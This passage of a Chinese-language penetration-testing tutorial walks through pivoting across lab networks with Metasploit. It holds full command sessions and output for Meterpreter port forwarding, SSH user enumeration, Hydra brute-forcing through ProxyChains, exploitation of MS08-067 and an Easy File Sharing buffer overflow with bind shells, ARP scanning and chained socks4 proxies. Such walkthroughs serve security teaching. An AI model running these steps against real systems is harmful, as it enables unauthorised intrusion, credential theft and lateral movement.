+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">    -L &lt;opt&gt;  Forward: local host to listen on (optional). Remote: local host to connect to.</span><br><span class="line">    -R        Indicates a reverse port forward.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the "list" command).</span><br><span class="line">    -l &lt;opt&gt;  Forward: local port to listen on. Reverse: local port to connect to.</span><br><span class="line">    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.</span><br><span class="line">    -r &lt;opt&gt;  Forward: remote host to connect to.</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当我们在浏览器中向本地2323端口发送一个链接请求时，该连接请求将会转发到IP地址为7.7.7.20的计算机的80端口。<br>得益于ProxyChains和Nmap，早先我们就已经确定了web服务运行在7.7.7.20的80端口。为了访问这个服务，本地系统的2323端口将被转发到7.7.7.20的80端口</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20</span><br><span class="line">[*] Local TCP relay created: 172.16.0.20:2323 &lt;-&gt; 7.7.7.20:80</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>通过portfwd list命令可以查看当前活跃的端口转发规则：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd list</span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line">   Index  Local             Remote       Direction</span><br><span class="line">   -----  -----             ------       ---------</span><br><span class="line">   1      172.16.0.20:2323  7.7.7.20:80  Forward</span><br><span class="line">1 total active port forwards.</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>检测到IP地址为7.7.7.20目标系统的80端口上运行着名为<strong>Eash File Sharing Web Server</strong>的应用</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload50147402844487092-874af3bc.jpeg" alt=""></p>
+<h2 id="通过中转跳板进行SSH暴力破解"><a href="#通过中转跳板进行SSH暴力破解" class="headerlink" title="通过中转跳板进行SSH暴力破解"></a>通过中转跳板进行SSH暴力破解</h2><p>正如你看到的，我们检测到的7.7.7.20上有一个ssh服务。对该服务进行暴力破解十分简便。我们可以使用SSH_enumusers这个辅助模块来完成这项工作：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line">msf auxiliary(ssh_enumusers) &gt; set rhosts 7.7.7.20</span><br><span class="line">rhosts =&gt; 7.7.7.20</span><br><span class="line">msf auxiliary(ssh_enumusers) &gt; set rport 22</span><br><span class="line">rport =&gt; 22</span><br><span class="line">msf auxiliary(ssh_enumusers) &gt; set user_file /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt</span><br><span class="line">user_file =&gt; /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt</span><br><span class="line">msf auxiliary(ssh_enumusers) &gt; run</span><br><span class="line">[*] 7.7.7.20:22 - SSH - Checking for false positives</span><br><span class="line">[*] 7.7.7.20:22 - SSH - Starting scan</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'admin' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'root' not found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'Administrator' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'sysadm' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'tech' not found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'operator' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'guest' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'security' not found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'debug' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'manager' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'service' not found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User '!root' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'user' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'netman' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'super' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'diag' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'Cisco' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'Manager' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'DTA' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'apc' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'User' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'Admin' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'cablecom' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'adm' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'wradmin' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'netscreen' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'sa' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'setup' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'cmaker' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'enable' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'MICRO' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'login' not found</span><br><span class="line">[*] Caught interrupt from the console...</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">^C</span><br><span class="line">msf auxiliary(ssh_enumusers) &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>除了Metasploit框架中的辅助模块外，Kali工具包中的Hydra也可以完成这项任务。通过在ProxyChains下运行Hydra，所有的通信数据将会通过被控制的主机（双网卡主机）传送到目标系统上。</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) starting</span><br><span class="line">[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 64 tasks, 20 login tries (l:2/p:10), ~0 tries per task</span><br><span class="line">[DATA] attacking service ssh on port 22</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">&lt;&gt;&lt;&gt;-OK</span><br><span class="line">&lt;&gt;&lt;&gt;-OK</span><br><span class="line">&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">[22][ssh] host: 7.7.7.20   login: admin   password: 123456</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) finished</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用Hydra执行brute-force攻击，我们获得代理服务器的用户名为admin，密码为123456。同时使用ProxyChains工具可以连接到远程的SSH服务</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains ssh admin@7.7.7.20</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">The authenticity of host '7.7.7.20 (7.7.7.20)' can't be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:Rcz2KrPF3BTo16Ng1kET91ycbr9c8vOkZcZ6b4VawMQ.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added '7.7.7.20' (ECDSA) to the list of known hosts.</span><br><span class="line">admin@7.7.7.20's password:</span><br><span class="line">bvshell:/C/Documents and Settings/All Users$ pwd</span><br><span class="line">/C/Documents and Settings/All Users</span><br><span class="line">bvshell:/C/Documents and Settings/All Users$ dir</span><br><span class="line">2016-12-24  21:32          &lt;DIR&gt; Application Data</span><br><span class="line">2016-12-25  06:16          &lt;DIR&gt; Desktop</span><br><span class="line">2016-12-24  18:36          &lt;DIR&gt; Documents</span><br><span class="line">2016-12-24  18:37          &lt;DIR&gt; DRM</span><br><span class="line">2016-12-24  21:32          &lt;DIR&gt; Favorites</span><br><span class="line">2016-12-24  18:38          &lt;DIR&gt; Start Menu</span><br><span class="line">2016-12-24  21:32          &lt;DIR&gt; Templates</span><br><span class="line">      0 Files                  0 bytes</span><br><span class="line">      7 Directories</span><br><span class="line">bvshell:/C/Documents and Settings/All Users$</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="获取第二层中转跳板的访问"><a href="#获取第二层中转跳板的访问" class="headerlink" title="获取第二层中转跳板的访问"></a>获取第二层中转跳板的访问</h2><p>如果你还记得，我们之前使用nmap扫描7.7.7.0/24找到了两个漏洞。一个是MS08-067，另一个是Easy File Share应用中的BOF漏洞，这两个方向都能让我们访问到目标主机。当然还有一个选择便是继续使用上面获取到的ssh进行访问，但这里我们选择以上两个方向。</p>
+<h3 id="MS08-067搭配Bind-TCP"><a href="#MS08-067搭配Bind-TCP" class="headerlink" title="MS08-067搭配Bind TCP"></a>MS08-067搭配Bind TCP</h3><p>该模块的完整路径为exploit/windows/smb/ms08_067_netapi，在Metasploit框架下利用MS08-067漏洞攻击目标系统。由于没有定义双向路由，目标系统无法直接到达我们的计算机，为此需要将bind_tcp设置为payload类型。在exploit操作成功之后，就将要对连接到目标系统的端口进行监听。bind_tcp和reverse_tcp的区别如下图：</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload651022899957203843-aaf1e449.jpeg" alt=""></p>
+<p>完整设置如下：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; show options</span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):</span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOST                     yes       The target address</span><br><span class="line">   RPORT    445              yes       The SMB service port</span><br><span class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Targeting</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; set rhost 7.7.7.20</span><br><span class="line">rhost =&gt; 7.7.7.20</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/bind_tcp</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; show options</span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):</span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOST    7.7.7.20         yes       The target address</span><br><span class="line">   RPORT    445              yes       The SMB service port</span><br><span class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line">Payload options (windows/meterpreter/bind_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line">   RHOST     7.7.7.20         no        The target address</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Targeting</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; run</span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] 7.7.7.20:445 - Automatically detecting the target...</span><br><span class="line">[*] 7.7.7.20:445 - Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown</span><br><span class="line">[*] 7.7.7.20:445 - We could not detect the language pack, defaulting to English</span><br><span class="line">[*] 7.7.7.20:445 - Selected Target: Windows 2003 SP2 English (NX)</span><br><span class="line">[*] 7.7.7.20:445 - Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (957999 bytes) to 7.7.7.20</span><br><span class="line">[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Easy-File-Share应用的BoF漏洞"><a href="#Easy-File-Share应用的BoF漏洞" class="headerlink" title="Easy File Share应用的BoF漏洞"></a>Easy File Share应用的BoF漏洞</h3><p>另一个漏洞就是有关于Easy File Share应用的了。可通过以下步骤进行设置</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">msf  &gt; use exploit/windows/http/easyfilesharing_seh</span><br><span class="line">msf exploit(easyfilesharing_seh) &gt; show options</span><br><span class="line">Module options (exploit/windows/http/easyfilesharing_seh):</span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   RHOST                   yes       The target address</span><br><span class="line">   RPORT  80               yes       The target port</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Easy File Sharing 7.2 HTTP</span><br><span class="line">msf exploit(easyfilesharing_seh) &gt; set rhost 7.7.7.20</span><br><span class="line">rhost =&gt; 7.7.7.20</span><br><span class="line">msf exploit(easyfilesharing_seh) &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/bind_tcp</span><br><span class="line">msf exploit(easyfilesharing_seh) &gt; run</span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] 7.7.7.20:80 - 7.7.7.20:80 - Sending exploit...</span><br><span class="line">[+] 7.7.7.20:80 - Exploit Sent</span><br><span class="line">[*] Sending stage (957999 bytes) to 7.7.7.20</span><br><span class="line">[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444) at 2016-12-26 14:21:11 +0300</span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1520</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">Interface 65539</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter</span><br><span class="line">Hardware MAC : 08:00:27:29:cd:cb</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 8.8.8.3</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">Interface 65540</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter #2</span><br><span class="line">Hardware MAC : 08:00:27:e3:47:43</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 7.7.7.20</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>攻击流程如下图</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload7160381282705997673-e00a99d4.jpeg" alt=""></p>
+<p>由于我们可以访问到7.7.7.20机器，我们需要再次执行信息收集。被命名为JC的机器和RD机器一样有两张网卡，这也意味着我们找到了第二个隐藏网络(8.8.8.0/24)</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1520</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">Interface 65539</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter</span><br><span class="line">Hardware MAC : 08:00:27:29:cd:cb</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 8.8.8.3</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">Interface 65540</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter #2</span><br><span class="line">Hardware MAC : 08:00:27:e3:47:43</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 7.7.7.20</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在第二个隐藏网络下执行Arp扫描继续收集信息</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24</span><br><span class="line">[*] Running module against SRV03</span><br><span class="line">[*] ARP Scanning 8.8.8.0/24</span><br><span class="line">[*]   IP: 8.8.8.3 MAC 08:00:27:29:cd:cb (CADMUS COMPUTER SYSTEMS)</span><br><span class="line">[*]   IP: 8.8.8.1 MAC 0a:00:27:00:00:03 (UNKNOWN)</span><br><span class="line">[*]   IP: 8.8.8.9 MAC 08:00:27:56:f1:7c (CADMUS COMPUTER SYSTEMS)</span><br><span class="line">[*]    IP: 8.8.8.13 MAC 08:00:27:13:a3:b1 (CADMUS COMPUTER SYSTEMS)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>ARP扫描结果显示在该网络下存在4台机器</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 8.8.8.0/24</span><br><span class="line">[*] Adding a route to 8.8.8.0/255.255.255.0...</span><br><span class="line">[+] Added route to 8.8.8.0/255.255.255.0 via 7.7.7.20</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line">msf &gt; route print</span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"> Subnet Netmask Gateway</span><br><span class="line"> ------ ------- -------</span><br><span class="line"> 7.7.7.0 255.255.255.0 Session 1</span><br><span class="line"> 8.8.8.0 255.255.255.0 Session 3</span><br></pre></td></tr></tbody></table></figure>
+
+<p>之后再次添加路由规则</p>
+<h2 id="两层层中转跳板"><a href="#两层层中转跳板" class="headerlink" title="两层层中转跳板"></a>两层层中转跳板</h2><p>在JC主机上收集信息时发现了8.8.8.0/24网络，另外之前我们就已经建立了172.16.0.0/24到7.7.7.0/24网络的路由规则。<br>在当前的情况下，网络数据包从172.16.0.20发到JC设备(第二层中转跳板)，数据首先要发到RD设备(第一层中转跳板)，然后RD主机再将数据传送到JC主机。如果攻击者(172.16.0.20)想将数据发送到8.8.8.0/24网络(发现的第二个隐藏网络)的任何一个主机时，就得建立一个新的路由规则。为了使用Metasploit框架以外的其他工具，我们必须运行一个socks4代理服务来连接两个跳板主机，并在proxychains工具的配置文件中重新定义新的代理服务器。</p>
+<p>攻击者机器(172.16.0.20)尝试向8.8.8.9发送网络数据包，要经过以下中转：</p>
+<ul>
+<li>RD：我不知道怎么访问到8.8.8.9，但我知道哪个系统能访问到它，我可以将数据发给它。</li>
+<li>JC：我知道怎么将数据从7.7.7.0/24网络发送到8.8.8.0/24网络。</li>
+</ul>
+<p>数据流如下图所示：</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload3944527952613210767-26225692.jpeg" alt=""></p>
+<h2 id="神器Proxychains"><a href="#神器Proxychains" class="headerlink" title="神器Proxychains"></a>神器Proxychains</h2><p>Proxychains工具负责连接代理服务器以及端对端的传输。在最后阶段，需要为新发现的8.8.8.0/24网络在本地1081端口设置一个新的socks4代理服务。</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4a</span><br><span class="line">msf auxiliary(socks4a) &gt; show options</span><br><span class="line">Module options (auxiliary/server/socks4a):</span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  172.16.0.20      yes       The address to listen on</span><br><span class="line">   SRVPORT  1080             yes       The port to listen on.</span><br><span class="line">Auxiliary action:</span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  </span><br><span class="line">msf auxiliary(socks4a) &gt; set SRVPORT 1081</span><br><span class="line">SRVPORT =&gt; 1081</span><br><span class="line">msf auxiliary(socks4a) &gt; run</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">[*] Starting the socks4a proxy server</span><br><span class="line">msf auxiliary(socks4a) &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在/etc/proxychains.conf配置文件中添加新的代理服务器。通过激活动态链设置，确保在不同的代理服务器之间能够正常切换。</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat /etc/proxychains.conf | grep -v "#"</span><br><span class="line">dynamic_chain</span><br><span class="line">proxy_dns</span><br><span class="line">tcp_read_time_out 15000</span><br><span class="line">tcp_connect_time_out 8000</span><br><span class="line">socks4  172.16.0.20 1080  # First Pivot</span><br><span class="line">socks4  172.16.0.20 1081  # Second Pivot</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Proxychains工具通过第二层跳板主机，可以对8.8.8.0/24目标网络进行nmap扫描：</p>
